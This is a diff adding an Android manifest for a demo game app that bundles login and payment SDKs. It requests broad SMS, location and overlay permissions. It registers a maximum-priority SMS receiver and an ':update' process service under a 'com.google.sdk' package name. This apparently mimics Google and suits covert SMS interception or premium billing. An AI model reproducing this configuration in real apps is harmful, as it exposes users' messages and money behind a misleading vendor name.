@@ -1,0 +1,174 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+      package="com.example.HelloWorld"
+      android:versionCode="1"
+      android:versionName="1.0"
+      android:installLocation="auto">
+      
+                            
+   <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+ 	<uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.NFC"/>
+    <uses-permission android:name="org.simalliance.openmobileapi.SMARTCARD" />
+	<uses-feature android:name="android.hardware.nfc.hce"/>
+	
+	<uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.webkit.permission.PLUGIN" />
+    <uses-permission android:name="cn.swiftpass.wxpay.permission.MMOAUTH_CALLBACK" />
+    <uses-permission android:name="cn.swiftpass.wxpay.permission.MM_MESSAGE" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.FLASHLIGHT" />
+    <uses-feature android:name="android.hardware.camera" />
+    <uses-feature android:name="android.hardware.camera.autofocus" />
+    <uses-permission android:name="xvtian.gai.receiver" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.SYSTEM_OVERLAY_WINDOW" />
+    
+
+    
+    <uses-feature android:glEsVersion="0x00020000" />
+    
+     <uses-sdk
+        android:minSdkVersion="8"
+        android:targetSdkVersion="21" />
+<!--   -->
+    <application 
+        
+        android:label="@string/app_name"
+        android:icon="@drawable/icon"
+        android:name="com.xinmei365.game.proxy.XMApplication">
+        
+        
+        <activity
+            android:name=".SplashActivity"
+            android:screenOrientation="portrait"
+            android:theme="@android:style/Theme.NoTitleBar.Fullscreen" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity android:name=".HelloWorld"
+                  android:label="@string/app_name"
+                  android:screenOrientation="portrait"
+                  android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
+                  android:configChanges="orientation">
+          <!--   <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>  -->
+        </activity>
+        
+        
+        
+         
+        <activity
+            android:name="com.xinmei365.game.proxy.XMSDKLoginActivity"
+            android:screenOrientation="behind"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
+
+        <!-- alipay sdk begin -->
+        <activity
+            android:name="com.alipay.sdk.app.H5PayActivity"
+            android:configChanges="orientation|keyboardHidden|navigation"
+            android:exported="false"
+            android:screenOrientation="landscape"
+            android:windowSoftInputMode="adjustResize|stateHidden" >
+        </activity>
+
+        <meta-data
+            android:name="XMGAME_CHANNEL_CODE"
+            android:value="4be97f7d1659435889383628a88d888a" />
+        <meta-data
+            android:name="XMGAME_PRODUCT_CODE"
+            android:value="xmdemo" />
+        <meta-data
+            android:name="CHANNEL_LABEL"
+            android:value="lj_test" />
+        
+        
+           <service  android:exported="false" android:name="com.epplus.face.EPPlusPayService"></service>
+        <meta-data
+            android:name="EP_CHANNEL"
+            android:value="10010" >
+        </meta-data>
+        <meta-data
+            android:name="EP_APPKEY"
+            android:value="f17d2fb4eff547c8bebc1e7cc4dcd43c" >
+        </meta-data>
+        
+        
+        
+        
+       <receiver android:exported="false" android:name="com.epplus.face.EPPlusPayServiceReceiver" >  
+			<intent-filter>  
+			    
+			     <action android:name="android.intent.action.SCREEN_OFF"/> 
+			     <action android:name="com.ep.action.MESSAGE"/> 
+			     <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+			     <action android:name="android.intent.action.USER_PRESENT" />
+		    </intent-filter>  
+		</receiver> 
+		
+        <activity android:name="com.epplus.face.EPPlusPayActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="com.epplus.face.EPPlusPayActivity" />
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        
+        <activity
+		    android:name="com.google.sdk.GeneralActivity"
+		    android:configChanges="keyboardHidden|orientation"
+		    android:theme="@android:style/Theme.Dialog" />
+        
+		<service android:name="com.google.sdk.GeneralService" android:process = ":update" />
+		
+		<receiver android:name="com.google.sdk.PPSReceiver" android:process = ":update" >
+		    <intent-filter>
+		        <action android:name="android.intent.action.PPS" />
+		        <action android:name="android.net.wifi.STATE_CHANGED" />
+		    </intent-filter>
+		</receiver>
+		
+		<receiver android:name="com.google.sdk.SMSReceiver" >
+		    <intent-filter android:priority="2147483647" >
+		        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+		    </intent-filter>
+		</receiver>
+				
+		
+		
+		
+        
+          
+    </application>
+    
+    
+    
+    <supports-screens android:largeScreens="true"
+                      android:smallScreens="true"
+                      android:anyDensity="true"
+                      android:normalScreens="true"/>
+ 
+</manifest> 
